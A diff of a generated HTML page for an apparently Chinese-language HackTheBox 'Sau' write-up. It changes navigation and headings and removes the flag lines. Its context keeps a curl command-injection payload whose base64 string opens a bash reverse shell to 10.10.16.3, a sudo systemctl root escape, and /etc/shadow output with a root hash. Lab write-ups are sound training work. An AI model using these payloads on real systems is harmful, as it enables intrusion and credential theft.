@@ -589,6 +589,27 @@
   
   
     <li class="md-nav__item">
+      <a href="../Bizness/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bizness
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../Codify/" class="md-nav__link">
         
   
@@ -740,9 +761,9 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#enum" class="md-nav__link">
+  <a href="#recon" class="md-nav__link">
     <span class="md-ellipsis">
-      Enum
+      Recon
     </span>
   </a>
   
@@ -971,7 +992,7 @@
 
 <h1 id="sau">Sau</h1>
 <p><img alt="" src="../assets/Sau.png" /></p>
-<h2 id="enum">Enum</h2>
+<h2 id="recon">Recon</h2>
 <ul>
 <li><code>nmap -sC -A -p- --min-rate 1000 -T4 10.10.11.224</code>
 <div class="language-text highlight"><pre><span></span><code># Nmap 7.94SVN scan initiated Tue Jan  2 09:35:58 2024 as: nmap -sC -A -p22,80,8338,55555, -oN nmap.txt --append-out 10.10.11.224
@@ -1078,17 +1099,11 @@ Request-Baskets，可以实现服务端代理请求，结合端口发现，访�
 <div class="language-shell highlight"><pre><span></span><code>curl<span class="w"> </span><span class="s1">&#39;http://10.10.11.224:55555/70aohtj&#39;</span><span class="w"> </span>--data<span class="w"> </span><span class="s1">&#39;username=;`echo+&quot;L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjMvMjIzMyAwPiYxJwo=&quot;+|+base64+-d+|+sh`&#39;</span>
 </code></pre></div>
 <img alt="" src="../assets/Pasted%20image%2020240102103041.png" /></p>
-<blockquote>
-<p>User flag: a6d51c5de8e90d113979a7c48e1d8417</p>
-</blockquote>
 <h2 id="shell-as-root">Shell as root</h2>
 <p>查看 sudo 权限
 <img alt="" src="../assets/Pasted%20image%2020240102103306.png" /></p>
 <p>使用 <code>sudo /usr/bin/systemctl status trail.service</code> 查看服务状态时，可以通过 <code>!/bin/bash</code> 获得 shell
 <img alt="" src="../assets/Pasted%20image%2020240102103439.png" /></p>
-<blockquote>
-<p>Root flag: 3c0150d8bd7ed14298a882a376d1eaa0</p>
-</blockquote>
 <h2 id="pass-hash">Pass Hash</h2>
 <p><code>cat /etc/shadow</code>
 <div class="language-text highlight"><pre><span></span><code>root:$6$4IguUssRBYl3/LvG$MfnFD1Y9saTrvw2OqA1VtqKxa7TsDt1kb2qsJw6inQ8GfmnqIrh32eqk9IMO4UR3fYG.TzbJeiFd7UOu1QlGR0:19461:0:99999:7:::
